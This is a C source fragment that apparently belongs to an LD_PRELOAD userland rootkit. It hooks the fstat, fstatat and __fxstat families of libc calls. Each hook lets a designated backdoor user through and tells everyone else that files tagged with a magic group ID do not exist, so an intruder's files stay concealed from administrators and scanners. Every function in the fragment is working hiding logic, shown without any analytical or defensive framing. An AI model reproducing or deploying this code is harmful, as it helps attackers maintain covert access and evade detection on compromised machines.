int fstat(int fd, struct stat *buf)
{
    HOOK(o_fxstat,C__FXSTAT);
    if(is_bdusr()) return o_fxstat(_STAT_VER,fd,buf);
    if(hfxstat(fd,MGID,32)) { errno=ENOENT; return -1; }
    return o_fxstat(_STAT_VER,fd,buf);
}

int fstat64(int fd, struct stat64 *buf)
{
    HOOK(o_fxstat64,C__FXSTAT64);
    if(is_bdusr()) return o_fxstat64(_STAT_VER,fd,buf);
    if(hfxstat(fd,MGID,64)) { errno=ENOENT; return -1; }
    return o_fxstat64(_STAT_VER,fd,buf);
}

int fstatat(int dirfd, const char *pathname, struct stat *buf, int flags)
{
    HOOK(o_fstatat,CFSTATAT);
    if(is_bdusr()) return o_fstatat(dirfd,pathname,buf,flags);
    if(hfxstat(dirfd,MGID,32) || hxstat(pathname,MGID,32)) { errno=ENOENT; return -1; }
    return o_fstatat(dirfd,pathname,buf,flags);
}

int fstatat64(int dirfd, const char *pathname, struct stat64 *buf, int flags)
{
    HOOK(o_fstatat64,CFSTATAT64);
    if(is_bdusr()) return o_fstatat64(dirfd,pathname,buf,flags);
    if(hfxstat(dirfd,MGID,64) || hxstat(pathname,MGID,64)) { errno=ENOENT; return -1; }
    return o_fstatat64(dirfd,pathname,buf,flags);
}

int __fxstat(int version, int fd, struct stat *buf)
{
    HOOK(o_fxstat,C__FXSTAT);
    if(is_bdusr()) return o_fxstat(version,fd,buf);
    if(hfxstat(fd,MGID,32)) { errno=ENOENT; return -1; }
    return o_fxstat(version,fd,buf);
}

int __fxstat64(int version, int fd, struct stat64 *buf)
{
    HOOK(o_fxstat64,C__FXSTAT64);
    if(is_bdusr()) return o_fxstat64(version,fd,buf);
    if(hfxstat(fd,MGID,64)) { errno=ENOENT; return -1; }
    return o_fxstat64(version,fd,buf);
}
